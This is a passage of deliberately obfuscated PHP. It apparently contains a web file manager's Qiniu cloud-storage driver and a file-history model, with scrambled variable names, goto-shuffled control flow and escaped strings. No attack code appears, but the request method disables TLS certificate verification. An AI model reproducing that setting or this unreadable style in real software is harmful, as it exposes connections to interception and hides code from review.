$c×Ç­òí¹), $BŠØÆÇˆ’Ø[29] => $BŠØÆÇˆ’Ø[77]); } $d„òŸŒ•…‹ = array($BŠØÆÇˆ’Ø[28] => $this->pathThis($c×Ç­òí¹), $BŠØÆÇˆ’Ø[76] => $this->getPathOuter($BŠØÆÇˆ’Ø[8] . $c×Ç­òí¹), $BŠØÆÇˆ’Ø[29] => $BŠØÆÇˆ’Ø[77], $BŠØÆÇˆ’Ø[184] => $BŠØÆÇˆ’Ø[50], $BŠØÆÇˆ’Ø[106] => $BŠØÆÇˆ’Ø[50], $BŠØÆÇˆ’Ø[1120] => !0, $BŠØÆÇˆ’Ø[1121] => !0); if (empty($D‡êšğÙ¦)) { $c×Ç­òí¹ = rtrim($c×Ç­òí¹, $BŠØÆÇˆ’Ø[8]) . $BŠØÆÇˆ’Ø[8]; $få£êñÈµ = $this->objectMeta($c×Ç­òí¹); if (!$få£êñÈµ) { return $d„òŸŒ•…‹; } } if (isset($D‡êšğÙ¦[$BŠØÆÇˆ’Ø[1176]])) { $d„òŸŒ•…‹[$BŠØÆÇˆ’Ø[184]] = $D‡êšğÙ¦[$BŠØÆÇˆ’Ø[1176]]; } return $d„òŸŒ•…‹; } public function listPath($c¿Ì°¯»òÙ, $d¹µá…©… = false) { goto c—Éö¬‰”¥; eÑÚ¡…Î‡«: $AšùªÔÌ½ê = $C¤Û«”„Û[33]; $cš¾øÄãë‘ = 1000; $Cë‚ Ãê­ã = $C¤Û«”„Û[8]; goto e¯óªâÁ‚Ã; c—Éö¬‰”¥: $C¤Û«”„Û =& $_SERVER[÷ÖêïÔÔÓ]; $c¿Ì°¯»òÙ = trim($c¿Ì°¯»òÙ, $C¤Û«”„Û[8]); $B¾â±©ÆËÖ = empty($c¿Ì°¯»òÙ) ? $C¤Û«”„Û[33] : $c¿Ì°¯»òÙ . $C¤Û«”„Û[8]; goto eÑÚ¡…Î‡«; e¯óªâÁ‚Ã: $e´Çš©Æ¸ = $fÇ‘Ï‚…å = array(); while (!0) { list($aÈÛ¤Ê½, $EÊÁ¨Ÿë’š) = $this->bucketManager->listFiles($this->bucket, $B¾â±©ÆËÖ, $AšùªÔÌ½ê, $cš¾øÄãë‘, $Cë‚ Ãê­ã); if ($EÊÁ¨Ÿë’š) { return !1; } $AšùªÔÌ½ê = array_key_exists($C¤Û«”„Û[1142], $aÈÛ¤Ê½) ? $AšùªÔÌ½ê = $aÈÛ¤Ê½[$C¤Û«”„Û[1173]] : $C¤Û«”„Û[33]; if (isset($aÈÛ¤Ê½[$C¤Û«”„Û[1177]])) { foreach ($aÈÛ¤Ê½[$C¤Û«”„Û[1177]] as $A…¶ŒÓ„¬) { if ($A…¶ŒÓ„¬ == $B¾â±©ÆËÖ) { continue; } $e´Çš©Æ¸[] = $this->folderInfo($A…¶ŒÓ„¬, $d¹µá…©…); } } if (isset($aÈÛ¤Ê½[$C¤Û«”„Û[1174]])) { foreach ($aÈÛ¤Ê½[$C¤Û«”„Û[1174]] as $AÎÓË’§›å) { if ($AÎÓË’§›å[$C¤Û«”„Û[88]] == $B¾â±©ÆËÖ) { continue; } $fÇ‘Ï‚…å[] = $this->fileInfo($AÎÓË’§›å[$C¤Û«”„Û[88]], $d¹µá…©…, $AÎÓË’§›å); } } if ($AšùªÔÌ½ê == $C¤Û«”„Û[33]) { break; } } return array($C¤Û«”„Û[75] => $e´Çš©Æ¸, $C¤Û«”„Û[74] => $fÇ‘Ï‚…å); goto f«‹åŞë£Ö; f«‹åŞë£Ö: } public function has($aÀŞ±ìá¥ô, $C™‹ˆõ—É = false, $eÜ¢¯ùÔéï = true) { goto cÉÅèÀø±£; DÔ¬¸ßõš–: $FõÒ ×„ˆ = 0; $C²«÷ª²Ñ¨ = 0; while (!0) { list($bàµ´¤åĞ, $F„ÁÊĞŞÁÕ) = $this->bucketManager->listFiles($this->bucket, $Dçªì÷–™, $e¹‰‹À•’˜, $A¤±…îø‚, $E ŠÅ›èê§); if ($F„ÁÊĞŞÁÕ) { return !1; } $e¹‰‹À•’˜ = array_key_exists($A¢–ÑÃÄá[1142], $bàµ´¤åĞ) ? $e¹‰‹À•’˜ = $bàµ´¤åĞ[$A¢–ÑÃÄá[1173]] : $A¢–ÑÃÄá[33]; if ($C™‹ˆõ—É) { if (!empty($bàµ´¤åĞ[$A¢–ÑÃÄá[1174]])) { $FõÒ ×„ˆ += count($bàµ´¤åĞ[$A¢–ÑÃÄá[1174]]); } if (!empty($bàµ´¤åĞ[$A¢–ÑÃÄá[1177]])) { $C²«÷ª²Ñ¨ += count($bàµ´¤åĞ[$A¢–ÑÃÄá[1177]]); } if ($e¹‰‹À•’˜ === $A¢–ÑÃÄá[33]) { break; } continue; } if ($eÜ¢¯ùÔéï) { if (!empty($bàµ´¤åĞ[$A¢–ÑÃÄá[1174]])) { return !0; } } else { if (!empty($bàµ´¤åĞ[$A¢–ÑÃÄá[1177]])) { return !0; } } if ($e¹‰‹À•’˜ == $A¢–ÑÃÄá[33]) { break; } } goto aİÃàó²Á¯; cÉÅèÀø±£: $A¢–ÑÃÄá =& $_SERVER[÷ÖêïÔÔÓ]; $aÀŞ±ìá¥ô = trim($aÀŞ±ìá¥ô, $A¢–ÑÃÄá[8]); $Dçªì÷–™ = empty($aÀŞ±ìá¥ô) ? $A¢–ÑÃÄá[33] : $aÀŞ±ìá¥ô . $A¢–ÑÃÄá[8]; goto C©ĞíÓğç; aİÃàó²Á¯: if ($C™‹ˆõ—É) { return array($A¢–ÑÃÄá[188] => $FõÒ ×„ˆ, $A¢–ÑÃÄá[189] => $C²«÷ª²Ñ¨); } return !1; goto e’½¼­ÊÅ; C©ĞíÓğç: $e¹‰‹À•’˜ = $A¢–ÑÃÄá[33]; $A¤±…îø‚ = 1000; $E ŠÅ›èê§ = $A¢–ÑÃÄá[8]; goto DÔ¬¸ßõš–; e’½¼­ÊÅ: } public function listAll($c†¤ÚŠ¦ˆ») { $c…‚¦İá¼¼ =& $_SERVER[÷ÖêïÔÔÓ]; $D‡·ŠØ²àº = $this->fileList($c†¤ÚŠ¦ˆ», 1); $CÕî¿»Áù = array(); foreach ($D‡·ŠØ²àº as $a» «¦–‚) { $CÕî¿»Áù[$a» «¦–‚[$c…‚¦İá¼¼[28]]] = $a» «¦–‚[$c…‚¦İá¼¼[78]]; } return $this->listAllFiles($c†¤ÚŠ¦ˆ», array_keys($CÕî¿»Áù), $CÕî¿»Áù); } public function canRead($A§‚Ü¼…ãÊ) { return $this->exist($A§‚Ü¼…ãÊ) ? !0 : !1; } public function canWrite($B×ŒŒ­ôê—) { return $this->exist($B×ŒŒ­ôê—) ? !0 : !1; } public function getContent($C‹šÏ‡•·) { return $this->fileSubstr($C‹šÏ‡•·, 0, -1); } public function setContent($BˆÒº©İßÔ, $C¼†î¥Ş¥æ = '') { $Aø¥­Ì§âˆ = $this->tempFile($this->pathThis($BˆÒº©İßÔ)); file_put_contents($Aø¥­Ì§âˆ, $C¼†î¥Ş¥æ); if ($this->upload($BˆÒº©İßÔ, $Aø¥­Ì§âˆ)) { $this->tempFileRemve($Aø¥­Ì§âˆ); return !0; } return !1; } public function refreshUrls($bäÑ¢µ“İÌ) { goto AùóÖƒ×Ï; fÄ¹å÷õé²: $aÙ„ƒ¾ö­ = new Qiniu\Cdn\CdnManager($this->auth); list($A²ñĞ¨Ÿ¶”, $e²×é¦ğÇ) = $aÙ„ƒ¾ö­->refreshUrls($e¤‘ˆõÑïê); if ($e²×é¦ğÇ) { return !1; } goto dÁ…ŞœªĞÁ; AùóÖƒ×Ï: $EÆ®ØäÈ‰ =& $_SERVER[÷ÖêïÔÔÓ]; $e¤‘ˆõÑïê = array(); if (is_array($bäÑ¢µ“İÌ)) { foreach ($bäÑ¢µ“İÌ as $C£‚Õ…®£) { $e¤‘ˆõÑïê[] = $this->link($C£‚Õ…®£); } } else { $e¤‘ˆõÑïê[] = $this->link($bäÑ¢µ“İÌ); } goto fÄ¹å÷õé²; dÁ…ŞœªĞÁ: return $A²ñĞ¨Ÿ¶”[$EÆ®ØäÈ‰[1178]] == $EÆ®ØäÈ‰[682] ? !0 : !1; goto F¯Û¿¥¹ç÷; F¯Û¿¥¹ç÷: } public function fileSubstr($BƒĞ½í·¡, $D¡‹åˆ, $fÛ«Œßƒö) { $Dõ¾õ“ƒÍ =& $_SERVER[÷ÖêïÔÔÓ]; if (!($Eµí–õÌå = $this->link($BƒĞ½í·¡))) { return !1; } $A‡Ä¾šĞ› = array($Dõ¾õ“ƒÍ[1145] => $D¡‹åˆ, $Dõ¾õ“ƒÍ[322] => $fÛ«Œßƒö); return $this->qnRequest($Eµí–õÌå, $A‡Ä¾šĞ›); } public function upload($b²†ìğ, $F¦‘³•ÙŠ, $cœºŞÉÖ§ = false, $dŒëÏ§Œ× = REPEAT_REPLACE) { $AÍª’Ö…ªÂ = new Qiniu\Storage\UploadManager(); $b“ÅÎ–á™ = $this->auth->uploadToken($this->bucket, $b²†ìğ); $E³ñÉ‰™‚Ã = get_file_mime(get_path_ext($F¦‘³•ÙŠ)); list($CÒÀ˜ø·ÚĞ, $Dò‚Ô«¨«á) = $AÍª’Ö…ªÂ->putFile($b“ÅÎ–á™, $b²†ìğ, $F¦‘³•ÙŠ, null, $E³ñÉ‰™‚Ã); return $Dò‚Ô«¨«á ? !1 : $this->getPathOuter($b²†ìğ); } public function uploadFormData($c‚šÁ£ÒÁ¸, $A‡ºàèš÷í = 3600) { return $this->uploadToken($c‚šÁ£ÒÁ¸, $A‡ºàèš÷í); } public function multiUploadFormData($aÖ§˜ß¾‚«, $E«Ï£èƒ = 3600) { return $this->uploadToken($aÖ§˜ß¾‚«, $E«Ï£èƒ); } private function uploadToken($D’²´Ñ°˜¹, $d±·Ü±Éª = 3600) { goto Fã¸ŠøïÁ; d™¸Ó—»àğ: $c©›¦¦Šš¨ = null; $f¤ªâÀ„ = $this->auth->uploadToken($this->bucket, $c©›¦¦Šš¨, $eçéƒğÒùê, $C–­Çè‚È, !0); $A™ˆË‡º = empty($this->region) || $this->region == $D‹©ÊœÅ›²[1181] ? $D‹©ÊœÅ›²[33] : $D‹©ÊœÅ›²[408] . $this->region; goto b¾´Ú‹Ú; Fã¸ŠøïÁ: $D‹©ÊœÅ›² =& $_SERVER[÷ÖêïÔÔÓ]; $eçéƒğÒùê = $d±·Ü±Éª; $C–­Çè‚È = array($D‹©ÊœÅ›²[1179] => $D‹©ÊœÅ›²[1180]); goto d™¸Ó—»àğ; b¾´Ú‹Ú: $d£Ã—¢ÂÃè = http_type() . "\72\57\57\165\160\154\157\141\144{$A™ˆË‡º}\x2e\161\x69\x6e\x69\x75\160\x2e\143\x6f\x6d\57"; return array($D‹©ÊœÅ›²[1182] => $f¤ªâÀ„, $D‹©ÊœÅ›²[1183] => $d£Ã—¢ÂÃè); goto bƒê×å­éë; bƒê×å­éë: } public function download($dêŒ¥ÑÄ, $BŒ¯Î§Ôğù) { goto eÜ†˜®Äß; e´š§Øìğ: $EäÃÑÉÂ» = 0; $E—œ“‹¥ò = 1024 * 200; $C ÃÖ‚á¼ = fopen($EÀõ“æ»÷¹, $bùˆŸíÈåœ[1184]); goto BÔ°Ï¾ğ‰Ê; eÜ†˜®Äß: $bùˆŸíÈåœ =& $_SERVER[÷ÖêïÔÔÓ]; $EÀõ“æ»÷¹ = IO::getPathInner(IO::mkfile($BŒ¯Î§Ôğù)); if (!($aÖ±½ßğ´Ê = $this->link($dêŒ¥ÑÄ))) { return !1; } goto e´š§Øìğ; BÔ°Ï¾ğ‰Ê: while (!0) { $dƒÉíóˆ” = array($bùˆŸíÈåœ[1145] => $EäÃÑÉÂ», $bùˆŸíÈåœ[322] => $E—œ“‹¥ò); $A£Îó¡øŸ = $this->qnRequest($aÖ±½ßğ´Ê, $dƒÉíóˆ”); if ($EäÃÑÉÂ» && ($B»ØÎ‹Çöì = @json_decode($A£Îó¡øŸ, !0))) { if (isset($B»ØÎ‹Çöì[$bùˆŸíÈåœ[1178]])) { return !1; } } fwrite($C ÃÖ‚á¼, $A£Îó¡øŸ); $EäÃÑÉÂ» += $E—œ“‹¥ò; if (strlen($A£Îó¡øŸ) < $E—œ“‹¥ò) { break; } } fclose($C ÃÖ‚á¼); return $BŒ¯Î§Ôğù; goto B´§…Ä÷‚„; B´§…Ä÷‚„: } public function link($E½ÚÃÜñŞ†, $bÓÇŠÓ’¼ã = '') { if (!$this->isFile($E½ÚÃÜñŞ†)) { return !1; } $C®Œ”èÈŸ = $this->getHost() . $_SERVER[÷ÖêïÔÔÓ][8] . $this->pathEncode($E½ÚÃÜñŞ†) . $bÓÇŠÓ’¼ã; return $this->auth->privateDownloadUrl($C®Œ”èÈŸ, 3600 * 12); } public function fileOut($E´‹ç¯ÁÀ, $CÑö·ôÊé„ = false, $Fçè¹¬çÆÚ = false, $bŸ½Š˜éÍõ = '') { $C¥¿áäóğ” =& $_SERVER[÷ÖêïÔÔÓ]; if (!$Fçè¹¬çÆÚ) { $Fçè¹¬çÆÚ = $this->pathThis($E´‹ç¯ÁÀ); } $AÛé–‹™÷† = $CÑö·ôÊé„ ? $C¥¿áäóğ”[1185] . rawurlencode($Fçè¹¬çÆÚ) : $C¥¿áäóğ”[33]; $CŞÈ‚­ƒÂ‚ = $this->link($E´‹ç¯ÁÀ, $AÛé–‹™÷†); $this->fileOutLink($CŞÈ‚­ƒÂ‚); } public function fileOutServer($a‚Ë‰Õ±èã, $CÔ•Îİ±¿‚ = false, $cä…ğ†šÛ = false, $D›ç°Éº” = '') { parent::fileOut($a‚Ë‰Õ±èã, $CÔ•Îİ±¿‚, $cä…ğ†šÛ, $D›ç°Éº”); } public function fileOutImage($dğ ç¢ğ‰‘, $c¯Õ²‰© = 250) { $eÃ»ì—ÎŠ = $this->link($dğ ç¢ğ‰‘, $_SERVER[÷ÖêïÔÔÓ][1186] . $c¯Õ²‰©); $this->fileOutLink($eÃ»ì—ÎŠ); } public function fileOutImageServer($CõË•¿Í“°, $eÃœšÌÂ¨„ = 250) { parent::fileOutImage($CõË•¿Í“°, $eÃœšÌÂ¨„); } public function fileOutLink($fÍÁŞÑ‰ˆá) { header($_SERVER[÷ÖêïÔÔÓ][153] . $fÍÁŞÑ‰ˆá); die; } public function hashMd5($EŠ¶º´ÍÀİ) { $bÕ¹³ŠŞöÔ =& $_SERVER[÷ÖêïÔÔÓ]; $E•‹‘õíÅ = $this->objectMeta($EŠ¶º´ÍÀİ); if (isset($E•‹‘õíÅ[$bÕ¹³ŠŞöÔ[193]])) { return $E•‹‘õíÅ[$bÕ¹³ŠŞöÔ[193]]; } $B®ëç¯Œ = $this->link($EŠ¶º´ÍÀİ, $bÕ¹³ŠŞöÔ[1187]); $c×Ò¶Ñè¬‘ = $this->qnRequest($B®ëç¯Œ, array(), !0); return !isset($c×Ò¶Ñè¬‘[$bÕ¹³ŠŞöÔ[194]]) ? !1 : $c×Ò¶Ñè¬‘[$bÕ¹³ŠŞöÔ[194]]; } public function qnRequest($e´›Ñ™ƒ–µ, $A‡†¶Ê¥™Ê = array(), $cè¢ù˜î« = false) { goto fé¸ÖÑ±¼; Fê¥Ìôâ‡Ç: curl_setopt($Bö”È·Æ, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($Bö”È·Æ, CURLOPT_SSL_VERIFYHOST, 0); curl_setopt($Bö”È·Æ, CURLOPT_NOPROGRESS, !1); goto AÉ²æ×ã ñ; AÉ²æ×ã ñ: curl_setopt($Bö”È·Æ, CURLOPT_PROGRESSFUNCTION, $FéŠòŠ’‚‡[1188]); curl_progress_start($Bö”È·Æ); if (isset($A‡†¶Ê¥™Ê[$FéŠòŠ’‚‡[1145]]) && $A‡†¶Ê¥™Ê[$FéŠòŠ’‚‡[322]] > 0) { $aÉé˜åä¼ = $A‡†¶Ê¥™Ê[$FéŠòŠ’‚‡[1145]]; $C”°½Á‡È = $A‡†¶Ê¥™Ê[$FéŠòŠ’‚‡[1145]] + ($A‡†¶Ê¥™Ê[$FéŠòŠ’‚‡[322]] - 1); curl_setopt($Bö”È·Æ, CURLOPT_RANGE, "{$aÉé˜åä¼}\x2d{$C”°½Á‡È}"); } goto A£ƒœ‹‘ò; A£ƒœ‹‘ò: curl_setopt($Bö”È·Æ, CURLOPT_FOLLOWLOCATION, 1); $c‡Å£öˆô = curl_exec($Bö”È·Æ); curl_progress_end($Bö”È·Æ); goto AÙ½ò“Ì’Œ; AÙ½ò“Ì’Œ: curl_close($Bö”È·Æ); if ($cè¢ù˜î«) { return @json_decode($c‡Å£öˆô, !0); } return $c‡Å£öˆô; goto eÌ«Ú‹—¾; aƒè‘ˆ–’Ì: curl_setopt($Bö”È·Æ, CURLOPT_RETURNTRANSFER, 1); curl_setopt($Bö”È·Æ, CURLOPT_CONNECTTIMEOUT, 3600); curl_setopt($Bö”È·Æ, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); goto Fê¥Ìôâ‡Ç; fé¸ÖÑ±¼: $FéŠòŠ’‚‡ =& $_SERVER[÷ÖêïÔÔÓ]; $Bö”È·Æ = curl_init(); curl_setopt($Bö”È·Æ, CURLOPT_URL, $e´›Ñ™ƒ–µ); goto aƒè‘ˆ–’Ì; eÌ«Ú‹—¾: } public function size($b„³ºø²Ñç) { $BÇ§ã²· = $this->objectMeta($b„³ºø²Ñç); return $BÇ§ã²· ? $BÇ§ã²·[$_SERVER[÷ÖêïÔÔÓ][78]] : 0; } public function info($fŞÅËå–’) { if ($this->isFolder($fŞÅËå–’)) { return $this->folderInfo($fŞÅËå–’); } else { if ($this->isFile($fŞÅËå–’)) { return $this->fileInfo($fŞÅËå–’); } } return !1; } public function exist($C¥ß·ò°‘) { return $this->isFile($C¥ß·ò°‘) || $this->isFolder($C¥ß·ò°‘); } public function isFile($Eàäƒ›æóŞ) { return !$this->isFolder($Eàäƒ›æóŞ) && $this->objectMeta($Eàäƒ›æóŞ); } public function isFolder($BšØ¬¤Âšî) { return $this->cacheMehod($_SERVER[÷ÖêïÔÔÓ][220], $BšØ¬¤Âšî); } protected function objectMeta($eáì çœĞÑ) { return $this->cacheMehod($_SERVER[÷ÖêïÔÔÓ][221], $eáì çœĞÑ); } protected function _objectMeta($CäµŠ·Åƒ’) { $Bä¶ò›ºÎó =& $_SERVER[÷ÖêïÔÔÓ]; list($aÆï´¸‚¹ˆ, $BÛØçá¼) = $this->bucketManager->stat($this->bucket, $CäµŠ·Åƒ’); if ($aÆï´¸‚¹ˆ) { $aÆï´¸‚¹ˆ[$Bä¶ò›ºÎó[78]] = intval($aÆï´¸‚¹ˆ[$Bä¶ò›ºÎó[1175]]); } return $aÆï´¸‚¹ˆ; } protected function _isFolder($D–ÀŒø–‘Æ) { $cÔÊ‰Ø =& $_SERVER[÷ÖêïÔÔÓ]; list($D„“¥ğ°òç, $Aºë‡Ã) = $this->bucketManager->listFiles($this->bucket, trim($D–ÀŒø–‘Æ, $cÔÊ‰Ø[8]) . $cÔÊ‰Ø[8], $cÔÊ‰Ø[33], 1, $cÔÊ‰Ø[8]); return !empty($D„“¥ğ°òç[$cÔÊ‰Ø[1174]]) || !empty($D„“¥ğ°òç[$cÔÊ‰Ø[1177]]) ? !0 : !1; } } goto fç¼İ¶ŒÔ; aÄÆËåàç: class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\157\x5f\163\x6f\165\162\143\145\x5f\x68\x69\163\164\157\x72\171"; public function addHistory($EŞÒ›ëíã, $EùâÕ‰Ğ™ = '') { $b…­ÀİöÅ¼ =& $_SERVER[÷ÖêïÔÔÓ]; $BµÃ‘„¸¸ã = array($b…­ÀİöÅ¼[380] => $EŞÒ›ëíã[$b…­ÀİöÅ¼[366]], $b…­ÀİöÅ¼[1332] => isset($EŞÒ›ëíã[$b…­ÀİöÅ¼[376]]) ? $EŞÒ›ëíã[$b…­ÀİöÅ¼[376]] : $EŞÒ›ëíã[$b…­ÀİöÅ¼[375]], $b…­ÀİöÅ¼[416] => $EŞÒ›ëíã[$b…­ÀİöÅ¼[415]], $b…­ÀİöÅ¼[513] => $EŞÒ›ëíã[$b…­ÀİöÅ¼[78]], $b…­ÀİöÅ¼[2189] => $EùâÕ‰Ğ™); $cƒ‰å¦ˆ» = $GLOBALS[$b…­ÀİöÅ¼[6]][$b…­ÀİöÅ¼[84]][$b…­ÀİöÅ¼[2190]]; if ($cƒ‰å¦ˆ» > 1) { $this->historyAutoClear($BµÃ‘„¸¸ã[$b…­ÀİöÅ¼[366]]); $this->add($BµÃ‘„¸¸ã); } Model($b…­ÀİöÅ¼[2191])->eventFileEdit($EŞÒ›ëíã[$b…­ÀİöÅ¼[366]]); } private function historyAutoClear($cŸÓÔÄ°) { goto cƒŒƒÛ‹Ù†; cƒŒƒÛ‹Ù†: $a¬ğØÍ”áæ =& $_SERVER[÷ÖêïÔÔÓ]; $CõÕ÷Î¿¾ò = Model($a¬ğØÍ”áæ[1057])->get($a¬ğØÍ”áæ[2192]); $f’Ø¹Ş±Äí = $GLOBALS[$a¬ğØÍ”áæ[6]][$a¬ğØÍ”áæ[84]][$a¬ğØÍ”áæ[2190]]; goto A’œìÆä×å; fİ²Î°‘‡—: if ($c˜ŠÖ²÷• >= 500) { return; } $AõÍÔŒÙœ = array($a¬ğØÍ”áæ[380] => $cŸÓÔÄ°); $BÀ…ŒîÚ‹„ = $this->field($a¬ğØÍ”áæ[2194])->where($AõÍÔŒÙœ)->order($a¬ğØÍ”áæ[2186])->select(); goto AÉ¡®ÖÛ÷²; A’œìÆä×å: $B­ÊÛœ¹ç„ = $CõÕ÷Î¿¾ò == $a¬ğØÍ”áæ[2193] ? 3 : $f’Ø¹Ş±Äí; if ($f’Ø¹Ş±Äí <= 1) { $B­ÊÛœ¹ç„ = 1; } $c˜ŠÖ²÷• = $B­ÊÛœ¹ç„ - 1; goto fİ²Î°‘‡—; b»³ÚŸ¸¬‡: $AõÍÔŒÙœ = array($a¬ğØÍ”áæ[382] => array($a¬ğØÍ”áæ[7], $AÅ¤Ã«ºÙâ)); $this->where($AõÍÔŒÙœ)->delete(); Model($a¬ğØÍ”áæ[418])->remove($E¶‚ï³íòƒ); goto bÀË–®ô—; D´Òì¯‰®™: $E¶‚ï³íòƒ = array_to_keyvalue($BÀ…ŒîÚ‹„, $a¬ğØÍ”áæ[33], $a¬ğØÍ”áæ[415]); $E¶‚ï³íòƒ = array_slice($E¶‚ï³íòƒ, $c˜ŠÖ²÷•); if (!$AÅ¤Ã«ºÙâ || !$E¶‚ï³íòƒ) { return; } goto b»³ÚŸ¸¬‡; AÉ¡®ÖÛ÷²: if (!$BÀ…ŒîÚ‹„ || $c˜ŠÖ²÷• >= count($BÀ…ŒîÚ‹„)) { return; } $AÅ¤Ã«ºÙâ = array_to_keyvalue($BÀ…ŒîÚ‹„, $a¬ğØÍ”áæ[33], $a¬ğØÍ”áæ[364]); $AÅ¤Ã«ºÙâ = array_slice($AÅ¤Ã«ºÙâ, $c˜ŠÖ²÷•); goto D´Òì¯‰®™; bÀË–®ô—: } public function listData($EÃŞŒˆÔ¼¬) { goto AïêÅíÜ; a£ªŠÜÆ: $Dğ˜½£ºÅ• = $this->field($e²ÂËÚš‚ã)->where($dóù¥¯Š„ì)->order($f¼Ò¶å…ö[2186])->selectPage(); $this->_listAppendUser($Dğ˜½£ºÅ•[$f¼Ò¶å…ö[350]]); $fçÛÁ„áŞà = Model($f¼Ò¶å…ö[1057])->get($f¼Ò¶å…ö[2192]); goto cøìƒÄ®Ş; cøìƒÄ®Ş: $eˆİˆÜÀ¶Œ = 3; if ($fçÛÁ„áŞà == $f¼Ò¶å…ö[2193]) { $Dğ˜½£ºÅ•[$f¼Ò¶å…ö[350]] = array_slice($Dğ˜½£ºÅ•[$f¼Ò¶å…ö[350]], 0, $eˆİˆÜÀ¶Œ); $Dğ˜½£ºÅ•[$f¼Ò¶å…ö[347]] = array($f¼Ò¶å…ö[2196] => 1, $f¼Ò¶å…ö[2197] => 20, $f¼Ò¶å…ö[2198] => 1, $f¼Ò¶å…ö[2199] => count($Dğ˜½£ºÅ•[$f¼Ò¶å…ö[350]])); } return $Dğ˜½£ºÅ•; goto eããæ…’‡Ã; AïêÅíÜ: $f¼Ò¶å…ö =& $_SERVER[÷ÖêïÔÔÓ]; $dóù¥¯Š„ì = array($f¼Ò¶å…ö[380] => $EÃŞŒˆÔ¼¬); $e²ÂËÚš‚ã = $f¼Ò¶å…ö[2195]; goto a£ªŠÜÆ; eããæ…’‡Ã: } protected function _listAppendUser(&$Bö‘²é´‹”) { $dˆõİç½õ… =& $_SERVER[÷ÖêïÔÔÓ]; $DÒ–ÉôË»î = array_to_keyvalue($Bö‘²é´‹”, $dˆõİç½õ…[33], $dˆõİç½õ…[1341]); $AåÜµ¿ˆçŠ = Model($dˆõİç½õ…[469])->userListInfo($DÒ–ÉôË»î); foreach ($Bö‘²é´‹” as &$d¸Ø¬—ğ…õ) { $A‡À«‹ˆšŸ = $d¸Ø¬—ğ…õ[$dˆõİç½õ…[1341]]; $d¸Ø¬—ğ…õ[$dˆõİç½õ…[375]] = $AåÜµ¿ˆçŠ[$A‡À«‹ˆšŸ] ? $AåÜµ¿ˆçŠ[$A‡À«‹ˆšŸ] : !1; } } public function fileInfo($A¦ìÎ¸Ê¬ï) { $d¦µçŒæ°¨ =& $_SERVER[÷ÖêïÔÔÓ]; $c©Úôä»Â¦ = $this->tablePrefix; $AÎ¶©ÛĞÈÕ = "{$c©Úôä»Â¦}\151\157\x5f\146\151\154\x65\40\x66\x69\154\x65\163\40\x6f\x6e\40\146\x69\154\145\x73\56\x66\151\154\x65\111\104\40\x3d\40\150\x69\163\x74\x6f\x72\171\x2e\146\x69\154\145\111\x44"; return $this->alias($d¦µçŒæ°¨[2200])->where(array($d¦µçŒæ°¨[382] => $A¦ìÎ¸Ê¬ï))->join($AÎ¶©ÛĞÈÕ, $d¦µçŒæ°¨[2201])->find(); } public function removeItem($EˆâÒ‘‚¢) { $fŸÙ©·í­‚ =& $_SERVER[÷ÖêïÔÔÓ]; $EÈ‘ïÇº“™ = array($fŸÙ©·í­‚[382] => $EˆâÒ‘‚¢); $eÆ«¨¡…ÆÖ = $this->where($EÈ‘ïÇº“™)->find(); if ($eÆ«¨¡…ÆÖ) { $Eïñ‚Í®£Ü = $this->where($EÈ‘ïÇº“™)->delete(); Model($fŸÙ©·í­‚[418])->remove($eÆ«¨¡…ÆÖ[$fŸÙ©·í­‚[415]]); return $Eïñ‚Í®£Ü; } return !1; } public function removeBySource($eœ±ß¡–¼) { goto bæÒ«Šà³; bæÒ«Šà³: $c–ˆ‹øÇãõ =& $_SERVER[÷ÖêïÔÔÓ]; if (!$eœ±ß¡–¼) { return !1; } if (!is_array($eœ±ß¡–¼)) { $eœ±ß¡–¼ = array($eœ±ß¡–¼); } goto Bò¼çÒ¢Ò¦; Bò¼çÒ¢Ò¦: $f¤†Š­ë½ = array($c–ˆ‹øÇãõ[380] => array($c–ˆ‹øÇãõ[7], $eœ±ß¡–¼)); $aÅˆ‹ë³” = $this->field($c–ˆ‹øÇãõ[416])->where($f¤†Š­ë½)->select(); if ($aÅˆ‹ë³”) { $this->where($f¤†Š­ë½)->delete(); $e›—Ë‡Šù = array_to_keyvalue($aÅˆ‹ë³”, $c–ˆ‹øÇãõ[33], $c–ˆ‹øÇãõ[415]); Model($c–ˆ‹øÇãõ[418])->remove($e›—Ë‡Šù); } goto AñÄ“ñÃÂ˜; AñÄ“ñÃÂ˜: return !0; goto bˆ…›¯‹; bˆ…›¯‹: } public function setDetail($FĞ½ÓÜ°Ë±, $Eİ¨³ƒŠ˜Ì) { $c“äãµ™‹„ =& $_SERVER[÷ÖêïÔÔÓ]; return $this->where(array($c“äãµ™‹„[382] => $FĞ½ÓÜ°Ë±))->save(array($c“äãµ™‹„[2189] => $Eİ¨³ƒŠ˜Ì)); } public function rollbackToItem($Dİã“‘‹¿®, $c‹ƒ¸Ğª¬) { goto Fê·Š§šë½; Fê·Š§šë½: $DÄÕ—×Ô =& $_SERVER[÷ÖêïÔÔÓ]; $F«ø‰¡ªìµ = Model($DÄÕ—×Ô[748])->sourceInfo($Dİã“‘‹¿®); $this->addHistory($F«ø‰¡ªìµ); goto aÌÀôŸ—ï; AÓÖå±‘÷µ: return $this->where(array($DÄÕ—×Ô[382] => $c‹ƒ¸Ğª¬))->delete(); goto eÒÃŠ‘Ú‹; aÌÀôŸ—ï: $FºÛ…¸ÍÁ¼ = $this->find($c‹ƒ¸Ğª¬); $D·Ğ„æ¾±â = array($DÄÕ—×Ô[415] => $FºÛ…¸ÍÁ¼[$DÄÕ—×Ô[415]], $DÄÕ—×Ô[78] => $FºÛ…¸ÍÁ¼[$DÄÕ—×Ô[78]], $DÄÕ—×Ô[106] => time(), $DÄÕ—×Ô[376] => USER_ID); Model($DÄÕ—×Ô[748])->where(array($DÄÕ—×Ô[366] => $Dİã“‘‹¿®))->save($D·Ğ„æ¾±â); goto AÓÖå±‘÷µ; eÒÃŠ‘Ú‹: } public function clearSame($C´¿ôÚë) { goto DŠ³Š˜Š; DŠ³Š˜Š: $aâõ½ÈÕÏÀ =& $_SERVER[÷ÖêïÔÔÓ]; $aÌôåª¹‡¤ = $this->listData($C´¿ôÚë); $F‚ß ßñÒš = array_to_keyvalue_group($aÌôåª¹‡¤, $aâõ½ÈÕÏÀ[415]); goto E³áÖáãíÏ; F¯Û¹è„ÎË: if (!$F·ëš–Ş£Ó) { return; } $this->where(array($aâõ½ÈÕÏÀ[364] => array($aâõ½ÈÕÏÀ[7], $F·ëš–Ş£Ó)))->delete(); Model($aâõ½ÈÕÏÀ[418])->remove($cÖÇŸ¶È¥‚); goto Ağ®¡’Ìì…; E³áÖáãíÏ: 